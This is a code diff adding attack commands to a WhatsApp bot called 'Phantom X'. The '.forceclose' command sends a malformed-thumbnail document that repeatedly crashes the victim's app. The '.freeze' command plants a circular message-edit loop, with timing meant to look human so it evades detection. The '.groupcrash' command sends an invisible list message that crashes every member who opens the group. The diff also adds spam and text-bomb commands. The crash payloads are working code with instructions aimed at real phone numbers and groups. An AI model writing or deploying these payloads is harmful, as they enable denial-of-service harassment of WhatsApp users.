+                        const bugBannerBuf = fs.readFileSync(BUG_BANNER_FILE);
+                        await sock.sendMessage(from, { image: bugBannerBuf, caption: bugMenuText }, { quoted: msg });
+                    } catch (_) {
+                        await reply(bugMenuText);
+                    }
+                } else {
+                    await reply(bugMenuText);
+                }
+                break;
+            }
 
             case ".zalgo": {
                 const zalgoInput = parts.slice(1).join(" ").trim();
@@ -7016,6 +7180,250 @@ _Can be started from any chat, but source members require source group access an
                 if (!clapInput) return reply("Usage: .clap <text>\nExample: .clap this is the best bot");
                 const clapOut = clapInput.split(" ").join(" 👏 ");
                 await reply(`👏 ${clapOut} 👏`);
+                break;
+            }
+
+            // ─── FORCE CLOSE BUG (Malformed Thumbnail) ───
+            // Sends 1 document with a PNG thumbnail claiming 65535×65535 dimensions
+            // but with corrupted body data. WA's image decoder allocates memory for
+            // the claimed size then panics on the corrupt body → force close on chat open.
+            // Persists in WA's media cache — crashes every open until cleared or reinstalled.
+            case ".forceclose":
+            case ".fc": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                const fcTarget = parseBugTarget(parts, msg);
+                if (!fcTarget) return reply(
+                    `💀 *Force Close Bug*\n\n` +
+                    `Usage: *.forceclose <number>*\nShortcut: *.fc <number>*\n` +
+                    `Example: *.forceclose 2348012345678*\n\n` +
+                    `_Sends 1 document with a malformed thumbnail binary._\n` +
+                    `_WA's image decoder crashes every time they open the chat._\n` +
+                    `_Persists until they clear WA media or reinstall._\n` +
+                    `_Use .bugmenu forceclose for full help._`
+                );
+                if (isDevProtected(fcTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
+                await reply(`💀 Sending force close payload to *${fcTarget.split("@")[0]}*...`);
+                try {
+                    if (!userCrashKeys[fcTarget]) userCrashKeys[fcTarget] = [];
+                    if (!userBugTypes[fcTarget]) userBugTypes[fcTarget] = [];
+
+                    // 1 document — malformed PNG thumbnail crashes the image decoder on render
+                    const fcProto = waProto.Message.fromObject({
+                        documentMessage: {
+                            mimetype:      "application/pdf",
+                            title:         "document.pdf",
+                            fileName:      "document.pdf",
+                            pageCount:     1,
+                            jpegThumbnail: buildMalformedThumb()
+                        }
+                    });
+                    const fcWAMsg = generateWAMessageFromContent(fcTarget, fcProto, { timestamp: new Date(), userJid: sock.user?.id });
+                    await sock.relayMessage(fcTarget, fcWAMsg.message, { messageId: fcWAMsg.key.id });
+                    userCrashKeys[fcTarget].push(fcWAMsg.key);
+
+                    if (!userBugTypes[fcTarget].includes("Force Close")) userBugTypes[fcTarget].push("Force Close");
+                    await reply(
+                        `✅ *Force close active on ${fcTarget.split("@")[0]}!*\n\n` +
+                        `💀 Malformed thumbnail delivered — 1 silent document.\n` +
+                        `📱 Their WA crashes every time they open the chat.\n` +
+                        `💾 Persists until they clear WA media or reinstall.\n` +
+                        `🔧 To undo: *.unbug ${fcTarget.split("@")[0]}*`
+                    );
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── FREEZE BUG (Circular DB Index Loop) ───
+            // Sends 3 packets with human-like timing to create a circular reference
+            // in the target's local msgstore.db:
+            //   Packet 1: Message A (anchor)
+            //   Packet 2: Message B quotes A + 5000 junk mentionedJids (SQLite read storm)
+            //   Packet 3: Edit A to quote B → A→B→A→B loop in their DB
+            // Effect: WA loads chat, reads A, tries to load B preview, reads B,
+            // tries to load A preview — infinite loop. Msgs blocked in & out.
+            // Persists after restart — only reinstall or .unbug clears it.
+            // 3 packets spaced 3.5s apart looks exactly like a human typing to WA.
+            case ".freeze": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                const freezeTarget = parseBugTarget(parts, msg);
+                if (!freezeTarget) return reply(
+                    `🧊 *Freeze Bug*\n\nUsage: *.freeze <number>*\nExample: *.freeze 2348012345678*\n\n` +
+                    `_Creates a circular DB index loop (A→B→A→B) in their local WA storage._\n` +
+                    `_Msgs blocked in & out. Persists after restart._\n` +
+                    `_3 packets with human timing — very low ban risk._\n\n` +
+                    `_Use .bugmenu freeze for full help._`
+                );
+                if (isDevProtected(freezeTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
+                await reply(`🧊 Deploying circular index trap on *${freezeTarget.split("@")[0]}*...\n\n⏳ Sending 3 packets (takes ~8 seconds)...`);
+                try {
+                    if (!userCrashKeys[freezeTarget]) userCrashKeys[freezeTarget] = [];
+                    if (!userBugTypes[freezeTarget]) userBugTypes[freezeTarget] = [];
+
+                    // Packet 1 — Message A (anchor point)
+                    const msgA = await sock.sendMessage(freezeTarget, { text: "\u200b" });
+                    userCrashKeys[freezeTarget].push(msgA.key);
+
+                    // Human-like delay — looks like someone typing a reply
+                    await delay(3500);
+
+                    // Packet 2 — Message B quotes A + 5000 junk JIDs (SQLite read storm)
+                    const msgB = await sock.sendMessage(freezeTarget, {
+                        text:     "\u200b",
+                        mentions: Array(5000).fill("0@s.whatsapp.net")
+                    }, { quoted: msgA });
+                    userCrashKeys[freezeTarget].push(msgB.key);
+
+                    // Human-like delay
+                    await delay(3500);
+
+                    // Packet 3 — Edit A to quote B (completing the A→B→A circular reference)
+                    const editProto = waProto.Message.fromObject({
+                        protocolMessage: {
+                            key:  msgA.key,
+                            type: 14, // MESSAGE_EDIT
+                            editedMessage: {
+                                extendedTextMessage: {
+                                    text: "\u200b",
+                                    contextInfo: {
+                                        stanzaId:      msgB.key.id,
+                                        participant:   freezeTarget,
+                                        quotedMessage: { conversation: "\u200b" },
+                                        mentionedJid:  Array(3000).fill("0@s.whatsapp.net")
+                                    }
+                                }
+                            }
+                        }
+                    });
+                    const editWAMsg = generateWAMessageFromContent(freezeTarget, editProto, { timestamp: new Date(), userJid: sock.user?.id });
+                    await sock.relayMessage(freezeTarget, editWAMsg.message, { messageId: editWAMsg.key.id });
+
+                    if (!userBugTypes[freezeTarget].includes("Freeze")) userBugTypes[freezeTarget].push("Freeze");
+                    await reply(
+                        `✅ *Circular index trap active on ${freezeTarget.split("@")[0]}!*\n\n` +
+                        `🔄 3 packets sent — velocity check: ✅ looks human\n` +
+                        `🧊 Their DB: A→B→A→B — loops forever on load\n` +
+                        `📵 Msgs blocked in & out — persists after restart\n` +
+                        `🔧 To undo: *.unbug ${freezeTarget.split("@")[0]}*`
+                    );
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── GROUP CRASH (Dead Zone — List Message DB Poison) ───
+            // Sends 1 invisible list message with 5000 fake mentionedJids + 100 rows
+            // of junk rowIds wrapped in massive invisible chars.
+            // WA's UI thread tries to "draw" the message and panics — crash on open.
+            // Effect persists in msgstore.db until message is deleted or app reinstalled.
+            case ".groupcrash": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                let gcTarget = null;
+                const gcArg = parts[1];
+                if (!gcArg) {
+                    if (!isGroup) return reply(
+                        `💣 *Group Crash*\n\n` +
+                        `Usage:\n` +
+                        `• *.groupcrash* — run inside the target group\n` +
+                        `• *.groupcrash <groupId>* — use group ID (from *.groupid*)\n` +
+                        `• *.groupcrash <invite link>* — paste invite link\n\n` +
+                        `_Sends 1 invisible payload — anyone who opens the group, WA crashes._\n` +
+                        `_Persists across restarts. Use *.ungroupcrash <groupId>* to restore._`
+                    );
+                    gcTarget = from;
+                } else if (gcArg.includes("chat.whatsapp.com/")) {
+                    const code = gcArg.split("chat.whatsapp.com/")[1]?.split(/[?#]/)[0];
+                    if (!code) return reply("❌ Invalid invite link.");
+                    try {
+                        const info = await sock.groupGetInviteInfo(code);
+                        gcTarget = info.id;
+                    } catch { return reply("❌ Could not resolve invite link. Make sure bot is in that group."); }
+                } else if (gcArg.endsWith("@g.us")) {
+                    gcTarget = gcArg;
+                } else {
+                    return reply("❌ Invalid target. Use a group ID (ends in @g.us) or a WhatsApp invite link.");
+                }
+                const gcName = groupNames[gcTarget] || gcTarget;
+                await reply(`💣 Deploying group crash to *${gcName}*...`);
+                try {
+                    if (!groupCrashKeys[gcTarget]) groupCrashKeys[gcTarget] = [];
+
+                    // 1 list message — invisible chars + 5000 junk JIDs + 100 junk rows
+                    const gcMsg    = buildGroupCrashMsg();
+                    const gcWAMsg  = generateWAMessageFromContent(gcTarget, gcMsg, { timestamp: new Date(), userJid: sock.user?.id });
+                    await sock.relayMessage(gcTarget, gcWAMsg.message, { messageId: gcWAMsg.key.id });
+                    groupCrashKeys[gcTarget].push(gcWAMsg.key);
+
+                    await reply(
+                        `✅ *Group crash active on "${gcName}"!*\n\n` +
+                        `💣 1 payload sent — invisible list message with DB poison.\n` +
+                        `☠️ Anyone who opens the group → WA crashes immediately.\n` +
+                        `📱 Works on Android & iOS — no tap needed.\n` +
+                        `💾 Persists across restarts until message is deleted.\n` +
+                        `🔧 To restore: *.ungroupcrash ${gcTarget}*`
+                    );
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── UNDO GROUP CRASH ───
+            // Deletes the crash message(s) from the group — restores normal access.
+            case ".ungroupcrash": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                const ugcArg = parts[1] || (isGroup ? from : null);
+                if (!ugcArg) return reply("Usage: .ungroupcrash <groupId>\n\nGet the group ID from *.groupid*\nOr run this inside the affected group.");
+                const ugcTarget = ugcArg.endsWith("@g.us") ? ugcArg : (isGroup ? from : null);
+                if (!ugcTarget) return reply("❌ Invalid group ID. Must end in @g.us");
+                const keys = groupCrashKeys[ugcTarget];
+                if (!keys || !keys.length) return reply("⚠️ No stored crash messages found for that group.\n\nThe bot may have restarted since the crash was sent.");
+                const ugcName = groupNames[ugcTarget] || ugcTarget;
+                await reply(`🔧 Undoing group crash on *${ugcName}*...`);
+                let deleted = 0;
+                for (const k of keys) {
+                    try {
+                        await sock.sendMessage(ugcTarget, { delete: k });
+                        deleted++;
+                        await delay(500);
+                    } catch (_) {}
+                }
+                delete groupCrashKeys[ugcTarget];
+                await reply(`✅ *Group restored!* Deleted ${deleted} crash message(s) from *${ugcName}*.\n\nMembers can now open the group normally.`);
+                break;
+            }
+
+            // ─── UNBUG (remove all personal bugs from a user) ───
+            case ".unbug": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                const unbugTarget = parseBugTarget(parts, msg);
+                if (!unbugTarget) return reply(`🔧 *Unbug*\n\nUsage: *.unbug <number>*\nExample: *.unbug 2348012345678*`);
+                const unbugKeys = userCrashKeys[unbugTarget];
+                if (!unbugKeys || !unbugKeys.length) return reply(`⚠️ Nothing active found for *${unbugTarget.split("@")[0]}*.\n\n_Either the bot was restarted since you sent it, or that number has not been targeted._`);
+                // Silent working message — auto-deletes in 2 seconds
+                let workingMsg;
+                try { workingMsg = await sock.sendMessage(from, { text: `⏳ Working on *${unbugTarget.split("@")[0]}*...` }, { quoted: msg }); } catch (_) {}
+                setTimeout(async () => { try { if (workingMsg) await sock.sendMessage(from, { delete: workingMsg.key }); } catch (_) {} }, 2000);
+                // Delete all stored payload keys
+                let unbugDeleted = 0;
+                for (const k of unbugKeys) {
+                    try {
+                        await sock.sendMessage(k.remoteJid || unbugTarget, { delete: k });
+                        unbugDeleted++;
+                        await delay(400);
+                    } catch (_) {}
+                }
+                const clearedTypes = (userBugTypes[unbugTarget] || []).join(", ") || "N/A";
+                delete userCrashKeys[unbugTarget];
+                delete userBugTypes[unbugTarget];
+                // Confirmation — auto-deletes in 10 seconds
+                let doneMsg;
+                try {
+                    doneMsg = await sock.sendMessage(from, {
+                        text:
+                            `✅ *${unbugTarget.split("@")[0]} — Cleared*\n\n` +
+                            `📦 Payloads removed: *${unbugDeleted}*\n` +
+                            `🧹 Bug types cleared: *${clearedTypes}*\n\n` +
+                            `_Their WhatsApp is back to normal._`
+                    });
+                } catch (_) {}
+                setTimeout(async () => { try { if (doneMsg) await sock.sendMessage(from, { delete: doneMsg.key }); } catch (_) {} }, 10000);
                 break;
             }
 
@@ -7115,6 +7523,79 @@ _Can be started from any chat, but source members require source group access an
                         `💡 *Tip:* If the bot is admin, use *.unlock* to re-open the group first.`
                     );
                 }
+                break;
+            }
+
+            // ─── SPAM ATTACK ───
+            // ⚠️ HONEST WARNING: This sends FROM your WhatsApp — risks YOUR account not theirs.
+            // Max 5 messages with a delay to reduce ban risk.
+            case ".spamatk": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                const saMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const saTarget = saMentioned[0];
+                const saTimes = Math.min(parseInt(parts[1]) || 5, 5);
+                if (!saTarget) return reply(
+                    `Usage: .spamatk @user [times 1-5]\n\n` +
+                    `⚠️ *IMPORTANT:*\n` +
+                    `This sends messages FROM your WhatsApp to the target.\n` +
+                    `It fills their inbox but does NOT ban them.\n` +
+                    `Sending too many messages risks getting YOUR number flagged.\n` +
+                    `Max is capped at 5 for your safety.`
+                );
+                await reply(`📨 Sending ${saTimes} spam messages to @${saTarget.split("@")[0]}...\n⚠️ Risk is on YOUR account — stay safe.`);
+                try {
+                    for (let i = 0; i < saTimes; i++) {
+                        await sock.sendMessage(saTarget, { text: `👻 Phantom X — Message ${i+1}/${saTimes}` });
+                        await delay(1500);
+                    }
+                    await reply(`✅ Done! Sent ${saTimes} messages to @${saTarget.split("@")[0]}.`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── EMOJI BOMB (1 message) ───
+            case ".emojibomb": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                const ebMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const ebTarget = ebMentioned[0] || from;
+                const ebEmoji = parts.find(p => /\p{Emoji}/u.test(p) && p !== parts[0]) || "💥";
+                await reply(`💣 Sending emoji bomb to @${ebTarget.split("@")[0]}...`);
+                try {
+                    await sock.sendMessage(ebTarget, { text: ebEmoji.repeat(500) });
+                    await reply(`✅ Emoji bomb sent to @${ebTarget.split("@")[0]}!`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── TEXT BOMB (max 5 messages with delay) ───
+            case ".textbomb": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.\nUsage: .textbomb @user <text> <times 1-5>\nExample: .textbomb @user hello 5");
+                const tbMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const tbTarget = tbMentioned[0];
+                if (!tbTarget) return reply("Usage: .textbomb @user <text> <times 1-5>");
+                const tbTimes = Math.min(parseInt(parts[parts.length - 1]) || 3, 5);
+                const tbText = parts.slice(2, parts.length - 1).join(" ").trim() || "👻 Phantom X";
+                try {
+                    for (let i = 0; i < tbTimes; i++) {
+                        await sock.sendMessage(tbTarget, { text: tbText });
+                        await delay(1200);
+                    }
+                    await reply(`✅ Sent *${tbTimes}* messages to @${tbTarget.split("@")[0]}.`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── GHOST PING ───
+            case ".ghostping": {
+                if (!isGroup) return reply("❌ Only works in groups.");
+                const gpMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                if (!gpMentioned.length) return reply("Usage: .ghostping @user\n\nTags someone silently — they get a notification but no visible message.");
+                try {
+                    const sent = await sock.sendMessage(from, { text: " ", mentions: gpMentioned });
+                    await delay(600);
+                    await sock.sendMessage(from, { delete: sent.key });
+                    await reply(`👻 Ghost pinged @${gpMentioned[0].split("@")[0]}!`);
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
 
